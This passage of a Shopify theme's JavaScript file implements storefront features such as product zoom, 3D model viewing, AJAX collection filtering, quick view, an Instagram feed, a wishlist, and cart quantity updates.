    },

    _updateSKU: function(evt) {
      var variant = evt.variant;
      $(this.selectors.SKU).html(variant.sku);
    },

    onUnload: function() {
      this.$container.off(this.settings.namespace);
    }
  });

  function _enableZoom($el){
    $($el).hover(
      function(){
        var zoomUrl = $(this).data('zoom');
        $(this).zoom({url: zoomUrl});
      }, function() {
        $(this).trigger('zoom.destroy');
      }
    );
  }

  function _destroyZoom($el){
    $($el).each(function(){
    	$(this).trigger('zoom.destroy');
     });
  }
  return Product;
})();

theme.ProductModel = (function() {
  var modelJsonSections = {};
  var models = {};
  var xrButtons = {};

  var selectors = {
    mediaGroup: '[data-product-single-media-group]',
    xrButton: '[data-shopify-xr]'
  };

  function init(modelViewerContainers, sectionId) {
    modelJsonSections[sectionId] = {
      loaded: false
    };

    modelViewerContainers.forEach(function(modelViewerContainer, index) {
      var mediaId = modelViewerContainer.getAttribute('data-media-id');
      var modelViewerElement = modelViewerContainer.querySelector(
        'model-viewer'
      );
      var modelId = modelViewerElement.getAttribute('data-model-id');

      if (index === 0) {
        var mediaGroup = modelViewerContainer.closest(selectors.mediaGroup);
        var xrButton = mediaGroup.querySelector(selectors.xrButton);
        xrButtons[sectionId] = {
          element: xrButton,
          defaultId: modelId
        };
      }

      models[mediaId] = {
        modelId: modelId,
        sectionId: sectionId,
        container: modelViewerContainer,
        element: modelViewerElement
      };
    });

    window.Shopify.loadFeatures([
      {
        name: 'shopify-xr',
        version: '1.0',
        onLoad: setupShopifyXr
      },
      {
        name: 'model-viewer-ui',
        version: '1.0',
        onLoad: setupModelViewerUi
      }
    ]);
    theme.LibraryLoader.load('modelViewerUiStyles');
  }

  function setupShopifyXr(errors) {
    if (errors) return;

    if (!window.ShopifyXR) {
      document.addEventListener('shopify_xr_initialized', function() {
        setupShopifyXr();
      });
      return;
    }

    for (var sectionId in modelJsonSections) {
      if (modelJsonSections.hasOwnProperty(sectionId)) {
        var modelSection = modelJsonSections[sectionId];

        if (modelSection.loaded) continue;
        var modelJson = document.querySelector('#ModelJson-' + sectionId);

        window.ShopifyXR.addModels(JSON.parse(modelJson.innerHTML));
        modelSection.loaded = true;
      }
    }
    window.ShopifyXR.setupXRElements();
  }

  function setupModelViewerUi(errors) {
    if (errors) return;

    for (var key in models) {
      if (models.hasOwnProperty(key)) {
        var model = models[key];
        if (!model.modelViewerUi) {
          model.modelViewerUi = new Shopify.ModelViewerUI(model.element);
        }
      }
    }
  }

  function removeSectionModels(sectionId) {
    for (var key in models) {
      if (models.hasOwnProperty(key)) {
        var model = models[key];
        if (model.sectionId === sectionId) {
          models[key].modelViewerUi.destroy();
          delete models[key];
        }
      }
    }
    delete modelJsonSections[sectionId];
  }

  return {
    init: init,
    removeSectionModels: removeSectionModels
  };
})();

theme.LibraryLoader = (function() {
  var types = {
    link: 'link',
    script: 'script'
  };

  var status = {
    requested: 'requested',
    loaded: 'loaded'
  };

  var cloudCdn = 'https://cdn.shopify.com/shopifycloud/';

  var libraries = {
    modelViewerUiStyles: {
      tagId: 'shopify-model-viewer-ui-styles',
      src: cloudCdn + 'model-viewer-ui/assets/v1.0/model-viewer-ui.css',
      type: types.link
    }
  };

  function load(libraryName, callback) {
    var library = libraries[libraryName];

    if (!library) return;
    if (library.status === status.requested) return;

    callback = callback || function() {};
    if (library.status === status.loaded) {
      callback();
      return;
    }

    library.status = status.requested;

    var tag;

    switch (library.type) {
      case types.script:
        tag = createScriptTag(library, callback);
        break;
      case types.link:
        tag = createLinkTag(library, callback);
        break;
    }

    tag.id = library.tagId;
    library.element = tag;

    var firstScriptTag = document.getElementsByTagName(library.type)[0];
    firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
  }

  function createScriptTag(library, callback) {
    var tag = document.createElement('script');
    tag.src = library.src;
    tag.addEventListener('load', function() {
      library.status = status.loaded;
      callback();
    });
    return tag;
  }

  function createLinkTag(library, callback) {
    var tag = document.createElement('link');
    tag.href = library.src;
    tag.rel = 'stylesheet';
    tag.type = 'text/css';
    tag.addEventListener('load', function() {
      library.status = status.loaded;
      callback();
    });
    return tag;
  }

  return {
    load: load
  };
})();
theme.tabs = (function(){
  function tabs(container){
    var $container = this.$container = $(container),
        sectionId = $container.attr('data-section-id'),
        tabs = this.tabs = '.product-tabs .tablink';
    
    $(tabs).on('click', function(e){
      e.preventDefault();
        $(this).parent().addClass("active").siblings().removeClass("active");
        var tab = $(this).attr("href");
        $(".tab-content").not(tab).css("display", "none");
        $(tab).fadeIn();
    });
    $('.acor-ttl .tablink').on('click', function(e){
      e.preventDefault();
        $(this).parent().toggleClass("active").next().slideToggle();
      	if($(window).width()<767) {
          var tabposition = $(this).offset();
          $("html, body").animate({ scrollTop: tabposition.top - 80 }, 500);
        }
    });
    if($(window).width()>767){
        $('.product-tabs li:first-child').addClass("active");
    	$('.tab-container h3:first-child + .tab-content').show();
    }
  }
  return tabs;
})();

// Product quick view
theme.QuickView = (function() {
  $('body').on( 'click', '.quick-view', function(e){
    $.ajax({
      beforeSend : function (){
        $('body').addClass("loading");
       },
      url: $(this).attr('href'),
      success: function(data) {

        $.magnificPopup.open({
          items: {
            src: '<div class="quick-view-popup mfpbox mfp-with-anim" id="content_quickview">' + data + '</div>',
            type: 'inline'
          },
          removalDelay:500,
          callbacks: {
            beforeOpen: function(){
             $('.stickyHeader').addClass('popup');
              this.st.mainClass = 'mfp-zoom-in';
            },
            open: function() {              
              	shopreviews();
            },
            close: function() {
               $('.stickyHeader').removeClass('popup');
              $( '#content_quickview' ).empty();
            }
          },
        });
      },
      complete: function() {
        $('body').removeClass("loading");
      }
    })
    e.preventDefault();
    e.stopPropagation();
  });
})();

theme.quotesl={};
theme.Quotes = (function(){
  function Quotes(container){
    var $container = this.$container = $(container),
        sectionId = $container.attr('data-section-id'),
        slider = this.quotesl = '#Quotes-' + sectionId;
    if(Shopify.designMode){
        var flktyData = $(slider).attr('data-flickity');
        if(slider.length){
            $(slider).flickity(JSON.parse(flktyData));
            setTimeout( function(){ $(slider).flickity('resize')});
        }
    }
      
  }
  return Quotes;
})();

theme.slideshows={};
theme.SlideshowSection = (function(){
  function SlideshowSection(container){
    var $container = this.$container = $(container);
    var sectionId = $container.attr('data-section-id');
    var slideshow = this.slideshow = '#ss' + sectionId;
    $(slideshow).flickity();
    
    var iframes = $(slideshow).find('.embed-player');
    resizePlayer(iframes, 16/9, $(slideshow));
    $(window).on("resize", function(){
      resizePlayer(iframes, 16/9, $(slideshow));
    });
  }
    // Resize player
    function resizePlayer(iframes, ratio, slideshow){
      if (!iframes[0]) return;
      var win = $(slideshow),
          width = win.width(),
          playerWidth,
          height = win.height(),
          playerHeight,
          ratio = ratio || 16/9;

      iframes.each(function(){
        var current = $(this);
        if (width / ratio < height){
          playerWidth = Math.ceil(height * ratio);
          current.width(playerWidth).height(height).css({
            left: (width - playerWidth) / 2,
             top: 0
            });
        } else {
          playerHeight = Math.ceil(width / ratio);
          current.width(width).height(playerHeight).css({
            left: 0,
            top: (height - playerHeight) / 2
          });
        }
      });
    }
    
  return SlideshowSection;
})();

// CATEGORY SLIDER
theme.collectionView = (function() {
  function collectionView(container) {
    var $container = this.$container = $(container);
    var sectionId = $container.attr('data-section-id'),
    	sliderSecond = $container.attr('data-section-timeout');
    
    $(document).on('change','#SortBySt',function(e){
		var value = $(this).val();
      	if ($("#CollectionFiltersForm").length){
			$("#SortBy").val(value).trigger('change');
        } else {
          if (value.length) {
            window.location.search = 'sort_by='+value;
          } else {
            window.location.href = window.location.href.replace(window.location.search, '');
          }
        }
	});
    
	$(document).on('click', '.change-view', function(e){
      var view = $(this).data('view'),
          currentUrl = document.URL,
          url = new URL(currentUrl);
      url.searchParams.set("view", view); // setting your param
      var newUrl = url.href;
      window.location = newUrl;
    });
    $(document).on('change', '.optTag', function(e){
      var URL =  $('.sidebar_tags').data('url'),
          paramString = window.location.search.substring(1),
      	  productFilters = $('input.optTag'),
          newTags = [],
          url = '';

        productFilters.each(function() {
            if ($(this).val() && $(this).is(":checked") == true) {
              newTags.push($(this).val());                        
            }
        });
        if(newTags.length){
        	var tags = newTags.join('+');
       		ajaxfilter(URL+'/'+tags+'?'+paramString);
        } else {
          	ajaxfilter(URL+'?'+paramString);
        }
	});
    $(document).on('change', '.flForm .custCheck, .prRange, #SortBy', function(e){
      var URL =  '//'+window.location.hostname+window.location.pathname,
      	formdata = $('#CollectionFiltersForm').serialize();
      //window.location.replace(URL+'?'+formdata);
      ajaxfilter(URL+'?'+formdata);
	});
  	$(document).on('click', 'a.actFilter', function(e){
      e.preventDefault();
      var URL =  '//'+window.location.hostname+$(this).attr('href');
      ajaxfilter(URL);
	});
    $(document).on('click', 'span.actFilter', function(){
      var filter = $(this).attr("data-value");
      $(".filterBox input[value='"+filter+"']").trigger("click");
	});
    $('.flbytags').each(function(){
		var filter = $(this).find("li");
        if(filter.length <= 0){$(this).hide()}
	});
  
  	ajaxfilter = (function(url){
        $.ajax({
          type: 'GET',
          url: url,
          data:{},
          beforeSend:function(){
            $('body').addClass('loading hideOverly');
          },
          complete: function(data){
            $('.productList .grid-products').html($(".productList .grid-products", data.responseText).html());
            $('.filters-toolbar__product-count').html($(".filters-toolbar__product-count", data.responseText).html());
            
           	$('.sidebar_tags').html($(".sidebar_tags", data.responseText).html());
            $('.active-facets').html($(".active-facets", data.responseText).html());

            $('.pagination').html($(".pagination", data.responseText).html());
            if(!$(".pagination", data.responseText).html()){
              $('.pagination').hide();
            } else {
              $('.pagination').show();
            }
            $('.infinitpaginOuter').html($(".infinitpaginOuter", data.responseText).html());
            if(!$(".infinitpaginOuter", data.responseText).html()){
              $('.infinitpagin').remove();
            }
            if(theme.mlcurrency){ currenciesChange("sapn.money"); }
            $('body').removeClass('loading hideOverly');
            if ($('.infinitpagin a.infinite').length){infiniteScroll();}
            loadMoreBtn();

            if($('.prRange').length){ priceSlider(); }
            if($('#sideProdSlider').length){ $("#sideProdSlider").flickity(); }

            history.pushState({page: url}, url, url);
          }
        });
    });

    infiniteScroll = function(){
      	var action = 'scroll load delayed-resize';
        $(window).on(action, function(){
          var moreURL = $('.infinitpagin a').attr('href');
          if ($('.infinitpagin a.infinite').length){
            var bottom = $('.infinitpagin').offset();
            var docTop = ($(document).scrollTop() + $(window).height() - 50);
            if( docTop > bottom.top){
              $(window).off(action);
              loadMore(moreURL);
            }
          }
        });
    }
    loadMoreBtn = function() {
        $(document).on('click', '.infinitpagin a.loadMore', function(e){
          	e.preventDefault();
          	var moreURL = $(this).attr('href');
			loadMore(moreURL);
        });
    }
    
    loadMore = function(moreURL) {
      if (moreURL.length){
        $.ajax({
          type: 'GET',
          dataType: 'html',
          url: moreURL,
          beforeSend:function(){
          	if ($('.infinitpaginOuter').attr('data-type') == "button" ){
            	$('body').addClass('loading hideOverly');
            } else {
              $('.infinitpagin a').show();
            }
          },
          complete: function (data) {
            if($('.productList .grid-products').length){
            	$('.productList .grid-products').append($(".productList .grid-products", data.responseText).html());
            } else {
              	$('.productList .list-view-items').append($(".productList .list-view-items", data.responseText).html());
            }
            if($(".infinitpagin", data.responseText).html()){
            	$('.infinitpagin').html($(".infinitpagin", data.responseText).html());
            } else {
            	$('.infinitpagin').remove();
            }
			if(theme.mlcurrency){ currenciesChange("sapn.money"); }
            if ($('.infinitpagin a.infinite').length){
              infiniteScroll();
            }
            $('body').removeClass('loading hideOverly');
          }
        });
      }
    }
    
    $(document).ready(function(){
      infiniteScroll();loadMoreBtn();
    });
  }
  return collectionView;
})();

theme.instagramSection = (function() {
  function instagramSection(container) {
    var $container = this.$container = $(container),
    	sectionId = $container.attr('data-section-id'),
        act = $container.attr('data-act'),
        limit = $container.attr('data-count');
    
    $.ajax({
		url: 'https://graph.instagram.com/me/media?fields=comments_count,like_count,id,media_type,media_url,permalink,thumbnail_url,caption,children&access_token='+act,
        type: 'GET',
        dataType: "json",
        success: function (res) {
        	var data = res.data,
				igdiv = '#instafeed'+sectionId,
               	html = '',
                bl = bl || true;

			$.each(data, function (index, el) {
                     if (index >= limit) return 0;
                     var img_url = el.thumbnail_url || el.media_url;
                     html += '<div class="gitem insta-img"><a rel="nofollow" class="instagram-" href="'+el.permalink+'" target="_blank"><img data-src="' + img_url + '" alt="" class="lazyload" /></a></div>';
            });
            $(igdiv).html(html);
            var option = $("#instafeed"+sectionId+".carousel").attr("data-flickity1") || '{}';
            var flkty = new Flickity("#instafeed"+sectionId+".carousel",JSON.parse(option));
		}
	});
  }
  return instagramSection;
})();

theme.slcarousel={};
theme.carousel = (function(){
    function carousel(container) {
    	var $container = this.$container = $(container),
          sectionId = $container.attr('data-section-id'),
          carousel = this.slcarousel = $($container).find('.carousel'),
    	  tabs = this.tabs = '#' + sectionId + ' .tablink',
    	  tabcontent = this.tabcontent = '#' + sectionId + ' .tab-content';
    
    if(Shopify.designMode){
        var flktyData = this.slcarousel.attr('data-flickity');
        if(this.slcarousel.length){
            this.slcarousel.flickity(JSON.parse(flktyData));
            setTimeout( function(){ $('.carousel').flickity('resize')});
        }
    }
    $(tabs).on('click', function(e){
        e.preventDefault();
        $(this).parent().addClass("active").siblings().removeClass("active");
        var tab = $(this).attr("href");
        $(tabcontent).not(tab).css("display", "none");
        $(tab).fadeIn().find('.carousel').flickity('resize');
    });
  }
  return carousel;
})();

theme.masonary = (function(){
    function masonary(container){
    	var $container = this.$container = $(container),
          sectionId = $container.attr('data-section-id'),
          masonary = this.masonary = $($container).find('.grid-masonary');
    
      loadMasonary(masonary);
      setTimeout( function(){ loadMasonary(masonary); },1000);
      function loadMasonary(masonary) {
        $(masonary).masonry({
            columnWidth: '.grid-sizer-'+sectionId,
            itemSelector: '.ms-item',
            percentPosition: true
        });
      }
  }
  return masonary;
})();

theme.ajaxCart = function(){
  	drawerTimeout: null,
  	quickshop(),wishlist(),updateWishlist();

	$(".continue-shopping, .modalOverly, .closeDrawer").click(function(){
        $(".modal").fadeOut(200);
    	$("body").removeClass("loading showOverly");
    });
    
    $(document).on('click','.add-to-cart', function(e){
        e.preventDefault();
        $('body').addClass('loading');
        $(this).next().find('.cartBtn').trigger('click');
    });
    
    function quickshop(){
      $(document).on('click touch', '.quickShop', function(e){
          e.preventDefault(); e.stopImmediatePropagation();
          var url = $(this).attr('href'),
              imgwrapper = $(this).parents('.grid-view-item').find(".gview-img"),
              wrapper = $(this).parents(".grid-view-item").find('.shopWrapper');
        
          $.ajax({
            url: url+'/?section_id=quick-shop',
            dataType: 'html',
            type: 'GET',
            beforeSend:function(){
              $(imgwrapper).append("<i class='at at-spinner4 at-spin'></i>");
              $(imgwrapper).addClass('showLoading');
            },
            success: function(data){
              $(".shopWrapper").removeClass('active').html("");
              $(wrapper).addClass('active').html(data);
            },
            complete: function(data){
              $(imgwrapper).removeClass('showLoading');
              $(imgwrapper).find('.at-spinner4').remove();
              if (theme.mlcurrency){ currenciesChange(".shopWrapper.active .priceSingle span.money"); }
            }
          });
      });
      $(document).on('click touch', '.closeShop', function(e){
      	e.preventDefault();
        $(this).parents(".shopWrapper").removeClass("active");
	  });
    }

  	function wishlist() {
       var cookieName = "wishlistList";
       $(document).on('click', '.addto-wishlist', function(e){
           e.preventDefault();
             var id = $(this).attr('rel');
             if($.cookie(cookieName) == null) {
               var str = '__'+id;
             } else {
               if($.cookie(cookieName).indexOf(id) == -1) {
                 var str = $.cookie(cookieName) + '__' + id;
                 	str = str.replace('____', '__');
               }
             }
             $.cookie(cookieName, str, {expires:30, path:'/'});
             $(this).find(".at").removeClass('at-heart-l').addClass('at-circle-notch-r at-spin');
             setTimeout(function(){
               $('.wishlist[rel="'+id+'"]').removeClass('addto-wishlist').find('span').text(theme.wlAvailable);
               $('.wishlist[rel="'+id+'"] .at').removeClass('at-circle-notch-r at-spin').addClass('at-heart');
               updateWishlist();
             }, 2000);
         });
      	
     }
     function updateWishlist() {
       var cookieName = "wishlistList";
       try {
         if($.cookie(cookieName) != null && $.cookie(cookieName) != '__' && $.cookie(cookieName) != '') {
           var str = String($.cookie(cookieName)).split("__");
           for (var i=0; i<str.length; i++) {
             if (str[i] != '') {
               $('.wishlist[rel="'+str[i]+'"]').removeClass('addto-wishlist').find('span').text(theme.wlAvailable);
               $('.wishlist[rel="'+str[i]+'"] .at').removeClass('at-heart-l').addClass('at-heart');
               $('.favCount').text(i).removeClass('hide');
             }
           }
         }
       }
       catch (err) {}
     }
};
window.addEventListener('DOMContentLoaded',function(){$(theme.ajaxCart);});

$(document).ready(function() {
  var sections = new theme.Sections();
  sections.register('header-section', theme.HeaderSection);
  sections.register('product', theme.Product);
  sections.register('collection-template', theme.collectionView);
  sections.register('product-template', theme.Product);
  sections.register('productTabs', theme.tabs);
  sections.register('map', theme.Maps);
  sections.register('slideshow-section', theme.SlideshowSection);
  sections.register('carousel', theme.carousel);
  sections.register('quotes', theme.Quotes);
  sections.register('masonary', theme.masonary);
  sections.register('instagram', theme.instagramSection);
});

var resizeTimer;
  $(window).resize(function () {
    clearTimeout(resizeTimer);
    resizeTimer = setTimeout(function () {
      $(window).trigger('delayed-resize');
    }, 250);
});

theme.countdown = function(){
    $(".saleTime, .atCounter").each(function(){
        var $this = $(this), date = $(this).data('date'), countDownDate = new Date(date).getTime();
        var x = setInterval(function(){
            var now = new Date().getTime(),	            
                distance = countDownDate - now,
                days = Math.floor(distance / (1000 * 60 * 60 * 24)),
                hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)),
                minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60)),
                seconds = Math.floor((distance % (1000 * 60)) / 1000);
            if(days > 99){
                days = ("00" + days).substr(-3);
            } else {
                days = ("00" + days).substr(-2);
            }
            hours = ("00" + hours).substr(-2);
            minutes = ("00" + minutes).substr(-2);
            seconds = ("00" + seconds).substr(-2);

            $($this).find(".days").html(days);
            $($this).find(".hours").html(hours);
            $($this).find(".minutes").html(minutes);
            $($this).find(".seconds").html(seconds);
            if (distance < 0){clearInterval(x); $($this).hide().parents('.timerl').hide(); }
        }, 1000);
      });
}

theme.init = function() {
  slate.rte.wrapTable();
  slate.rte.iframeReset();
  theme.countdown();

  // Common a11y fixes
  slate.a11y.pageLinkFocus($(window.location.hash));

  $('.in-page-link').on('click', function(evt){
    slate.a11y.pageLinkFocus($(evt.currentTarget.hash));
  });

  $('a[href="#"]').on('click', function(evt){
    evt.preventDefault();
  });
};
$(theme.init);

$(document).ready(function() {
  "use strict";
  
	$(document).on('click', '.currencyOpt', function(i){
      $('#CurrencySelector').val($(this).data('value'));
      $('#localization_form').submit();
    });
    $(document).on('click', '.clOtp', function(i){
      var form = $(this).parents('form');
      $(form).find('.slcrlg').val($(this).data('value'));
      $(form).submit();
    });
  
   // LOOKBOOK SHOP 
	$('.btn-shop').click(function(){
       $('.products .list-columns, .grid-lookbook').removeClass('active');
       $(this).next().addClass('active');
       $(this).parents('.grid-lookbook').addClass('active');
	});
	$('.btn-shop-close').click(function(){     
    	$(this).parent().removeClass('active');
	});

  	// PROMOTION HEADER show-hide
	if($.cookie('promotion') == 'true') {
    	$(".notification-bar").slideUp();
  	}
	$(".close-announcement").click(function(){
		$(".notification-bar").slideUp();
		$.cookie('promotion', 'true', { expires: 1, path:'/'});
	});
  
	// SHOW HIDE PRODUCT Filters
  	$(document).on('click touch', '.btn-filter, .closeFilter', function(){
    	$(".filterbar").toggleClass("active");
	});
	$("body").click(function(event ){
    	var $target = $(event.target);
    	if(!$target.parents().is(".sb_filter") && !$target.is(".sb_filter")&& !$target.is(".btn-filter")){
      		$(".sb_filter").removeClass("active");
    	}
	});
  
  // STICKY HEADER
  window.onscroll = function(){ scrollFunction() };
  function scrollFunction() {
	if (theme.fixedHeader){

    if($("body").hasClass("template-product") == false){
      if($(window).scrollTop()>145) {     
          $('#header').addClass("stickyHeader animated fadeInDown");
          $('.stickySpace').css("min-height",$('#header').height());
      } else {
          $('#header').removeClass("stickyHeader fadeInDown");
          $('.stickySpace').css("min-height",'');
      }
    }else{
      // $(window).scrollTop()>145?   
      // $("[section-name = 'product-tabs-nav']").slideDown():
      // $("[section-name = 'product-tabs-nav']").slideUp();

      $(window).scrollTop()>150?   
      $("[section-name = 'product-tabs-nav']").addClass("fixed"):
      $("[section-name = 'product-tabs-nav']").removeClass("fixed");
    }
  }

    
    /// sticky cart
    var stickyCartht = $(".stickyCart").height();
    if($(window).scrollTop()>600 && $(".stickyCart").length){
      	$("body.template-product").css('padding-bottom',stickyCartht);
        $(".stickyCart").slideDown();
    } else {
      	$("body.template-product").css('padding-bottom','0');
        $(".stickyCart").slideUp();
    }

    // SITE SCROLLER
    if($(window).scrollTop()>200){
      $("#site-scroll").fadeIn();
    } else {
      $("#site-scroll").fadeOut();
    }
  }
  
  $("#site-scroll").click(function() {
    $("html, body").animate({ scrollTop: 0 }, 1000);
    return false;
  }); 
  
   //Footer links for mobiles
  $(".footer-links .h4").click(function() {
    if($(window).width() < 770){
      $(this).toggleClass("active");
      $(this).next().slideToggle();
  	}
  });
  
  $(document).on('click', '.gridSwatches li:not(.noImg)', function(e){
      var $this = $(this),
          newImage = $(this).attr('rel'),
          gridWrapper = $(this).parents('.grid-view-item').find('.gimg-link');
      $(gridWrapper).find('.variantImg').css("background-image", "url('"+newImage+"')");
      var image = document.createElement('img');
          image.src = newImage;
          image.onload = function () {
              $(gridWrapper).addClass("showVariantImg");
              $this.siblings().removeClass("active");
              $this.addClass("active");
          };
      return false;
    });
});

function htmlDecode(input){
    var doc = new DOMParser().parseFromString(input, "text/html");
    return doc.documentElement.textContent;
}
document.querySelectorAll('.mtmltxt').forEach(function(item){
    item.innerHTML = htmlDecode(item.innerHTML);
});
class ProductRecommendations extends HTMLElement {
  constructor(){super();}
  connectedCallback() {
    const handleIntersection = (entries, observer) => {
      if (!entries[0].isIntersecting) return;
      observer.unobserve(this);

      fetch(this.dataset.url).then(response => response.text()).then(text => {
          const html = document.createElement('div');
          html.innerHTML = text;
          const recommendations = html.querySelector('product-recommendations');

          if (recommendations && recommendations.innerHTML.trim().length) {
            this.innerHTML = recommendations.innerHTML;
          }
          if (html.querySelector('.gitem')) {
            this.classList.add('product-recommendations--loaded');
            var option = $('.recomPr').attr("data-flickity") || '{}';
            var flkty = new Flickity('.recomPr',JSON.parse(option));
            theme.countdown();shopreviews();
          }
        })
        .catch(e => {
          console.error(e);
        });
    }
    new IntersectionObserver(handleIntersection.bind(this), {rootMargin: '0px 0px 400px 0px'}).observe(this);
  }
}
customElements.define('product-recommendations', ProductRecommendations);

function getFocusableElements(container) {
  return Array.from(
    container.querySelectorAll(
      "summary, a[href], button:enabled, [tabindex]:not([tabindex^='-']), [draggable], area, input:not([type=hidden]):enabled, select:enabled, textarea:enabled, object, iframe"
    )
  );
}

class QuantityInput extends HTMLElement {
  constructor() {
    super();
    this.input = this.querySelector('input');
    this.changeEvent = new Event('change', { bubbles:true })
    this.querySelectorAll('.qtyBtn').forEach(
      (button) => button.addEventListener('click', this.onButtonClick.bind(this))
    );
  }

  onButtonClick(e) {
    e.preventDefault();
    const previousValue = this.input.value;

    e.target.name === 'plus' ? this.input.stepUp() : this.input.stepDown();
    if (previousValue !== this.input.value) this.input.dispatchEvent(this.changeEvent);
  }
}
customElements.define('quantity-input', QuantityInput);

function debounce(fn, wait) {
  let t;
  return (...args) => {
    clearTimeout(t);
    t = setTimeout(() => fn.apply(this, args), wait);
  };
}

function fetchConfig(type = 'json') {
  return {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Accept': `application/${type}` }
  };
}

function removeTrapFocus(elementToFocus = null) {
  document.removeEventListener('focusin', trapFocusHandlers.focusin);
  document.removeEventListener('focusout', trapFocusHandlers.focusout);
  document.removeEventListener('keydown', trapFocusHandlers.keydown);

  if (elementToFocus) elementToFocus.focus();
}

const trapFocusHandlers = {};
function trapFocus(container, elementToFocus = container) {
  var elements = getFocusableElements(container);
  var first = elements[0];
  var last = elements[elements.length - 1];

  removeTrapFocus();

  trapFocusHandlers.focusin = (e) => {
    if ( e.target !== container && e.target !== last && e.target !== first )
      return;

    document.addEventListener('keydown', trapFocusHandlers.keydown);
  };

  trapFocusHandlers.focusout = function() {
    document.removeEventListener('keydown', trapFocusHandlers.keydown);
  };

  trapFocusHandlers.keydown = function(e) {
    if (e.code.toUpperCase() !== 'TAB') return; // If not TAB key
    // On the last focusable element and tab forward, focus the first element.
    if (e.target === last && !e.shiftKey) {
      e.preventDefault();
      first.focus();
    }
    //  On the first focusable element and tab backward, focus the last element.
    if ((e.target === container || e.target === first) && e.shiftKey){
      e.preventDefault();
      last.focus();
    }
  };
  document.addEventListener('focusout', trapFocusHandlers.focusout);
  document.addEventListener('focusin', trapFocusHandlers.focusin);
  elementToFocus.focus();
}

class CartRemoveButton extends HTMLElement {
  constructor() {
    super();
    this.addEventListener('click', (e) => {
      e.preventDefault();
      const cartItems = this.closest('cart-items') || this.closest('cart-drawer-items');
      cartItems.updateQuantity(this.dataset.index, 0);
    });
  }
}
customElements.define('cart-remove-button', CartRemoveButton);

class CartItems extends HTMLElement {
  constructor() {
    super();
    this.lineItemStatusElement = document.getElementById('shopping-cart-line-item-status') || document.getElementById('CartDrawer-LineItemStatus');
    this.currentItemCount = Array.from(this.querySelectorAll('[name="updates[]"]')).reduce((total, quantityInput) => total + parseInt(quantityInput.value), 0);
    this.debouncedOnChange = debounce((e) => {
      this.onChange(e);
    }, 300);
    this.addEventListener('change', this.debouncedOnChange.bind(this));
  }

  onChange(e){
    if(e.target.id != 'cartTearm' && e.target.id != 'coupon-code' ){
        this.updateQuantity(e.target.dataset.index, e.target.value, document.activeElement.getAttribute('name'));
    }
  }

  getSectionsToRender(){
    return [
      {
        id: 'main-cart-items',
        section: document.getElementById('main-cart-items').dataset.id,
        selector: '.js-contents',
      },
      {
        id: 'main-cart-footer',
        section: document.getElementById('main-cart-footer').dataset.id,
        selector: '.cartTotal',
      }
    ];
  }

  updateQuantity(line, quantity, name) {
    this.enableLoading(line);

    const body = JSON.stringify({
      line,
      quantity,
      sections: this.getSectionsToRender().map((section) => section.section),
      sections_url: window.location.pathname
    });

    fetch(`${routes.cart_change_url}`, {...fetchConfig(), ...{ body }})
      .then((response) => {
        return response.text();
      })
      .then((state) => {
        const parsedState = JSON.parse(state);
        const quantityElement = document.getElementById(`Quantity-${line}`) || document.getElementById(`Drawer-quantity-${line}`);
        this.classList.toggle('is-empty', parsedState.item_count === 0);
        const cartDrawerWrapper = document.querySelector('cart-drawer');
        const cartFooter = document.getElementById('main-cart-footer');

        if (parsedState.errors){
          quantityElement.value = quantityElement.getAttribute('value');
          this.updateLiveRegions(line, 'none');
        }
        
        if (cartFooter) cartFooter.classList.toggle('is-empty', parsedState.item_count === 0);
        if (cartDrawerWrapper) cartDrawerWrapper.classList.toggle('is-empty', parsedState.item_count === 0);

        this.getSectionsToRender().forEach((section => {
          const elementToReplace = document.getElementById(section.id).querySelector(section.selector) || document.getElementById(section.id);
                elementToReplace.innerHTML = this.getSectionInnerHTML(parsedState.sections[section.section], section.selector);
        }));

        this.updateLiveRegions(line, parsedState.item_count);
        const lineItem =  document.getElementById(`CartItem-${line}`) || document.getElementById(`CartDrawer-Item-${line}`);
        if (lineItem && lineItem.querySelector(`[name="${name}"]`)) {
          cartDrawerWrapper ? trapFocus(cartDrawerWrapper, lineItem.querySelector(`[name="${name}"]`)) : lineItem.querySelector(`[name="${name}"]`).focus();
        } else if (parsedState.item_count === 0 && cartDrawerWrapper) {
          trapFocus(cartDrawerWrapper.querySelector('.drawer__inner-empty'), cartDrawerWrapper.querySelector('a'))
        } else if (document.querySelector('.cart-item') && cartDrawerWrapper) {
          trapFocus(cartDrawerWrapper, document.querySelector('.cart-item__name'))
        }
        this.disableLoading();
      }).catch(() => {
        this.querySelectorAll('.loading-overlay').forEach((overlay) => overlay.classList.add('hidden'));
        const errors = document.getElementById('cart-errors') || document.getElementById('CartDrawer-CartErrors');
        errors.textContent = window.cartStrings.error;
        this.disableLoading();
      });
  }

  updateLiveRegions(line, itemCount){
    if (this.currentItemCount === itemCount || itemCount == 'none' ) {
      const lineItemError = document.getElementById(`Line-item-error-${line}`) || document.getElementById(`CartDrawer-LineItemError-${line}`);
      const quantityElement = document.getElementById(`Quantity-${line}`) || document.getElementById(`Drawer-quantity-${line}`);
      lineItemError.classList.add('error-alert');
      lineItemError.querySelector('.ctItem-error').innerHTML = window.cartStrings.quantityError.replace('[quantity]',quantityElement.value);
    }

    this.currentItemCount = itemCount;
    this.lineItemStatusElement.setAttribute('aria-hidden', true);

    const cartStatus = document.getElementById('cart-live-region-text') || document.getElementById('CartDrawer-LiveRegionText');
    cartStatus.setAttribute('aria-hidden', false);
    freeShippMsg();

    setTimeout(() => {
      cartStatus.setAttribute('aria-hidden', true);
    }, 1000);
  }

  getSectionInnerHTML(html, selector) {
    return new DOMParser().parseFromString(html, 'text/html').querySelector(selector).innerHTML;
  }

  enableLoading(line) {
    const mainCartItems = document.getElementById('main-cart-items') || document.getElementById('CartDrawer-CartItems');
    mainCartItems.classList.add('cart__items--disabled');

    const cartItemElements = this.querySelectorAll(`#CartItem-${line} .loading-overlay`);
    const cartDrawerItemElements = this.querySelectorAll(`#CartDrawer-Item-${line} .loading-overlay`);

    [...cartItemElements, ...cartDrawerItemElements].forEach((overlay) => overlay.classList.remove('hidden'));

    document.activeElement.blur();
    this.lineItemStatusElement.setAttribute('aria-hidden', false);
  }

  disableLoading() {
    const mainCartItems = document.getElementById('main-cart-items') || document.getElementById('CartDrawer-CartItems');
    mainCartItems.classList.remove('cart__items--disabled');
  }
}
customElements.define('cart-items', CartItems);

if (!customElements.get('cart-note')) {
  customElements.define('cart-note', class CartNote extends HTMLElement {
    constructor() {
      super();
      this.addEventListener('change', debounce((e) => {
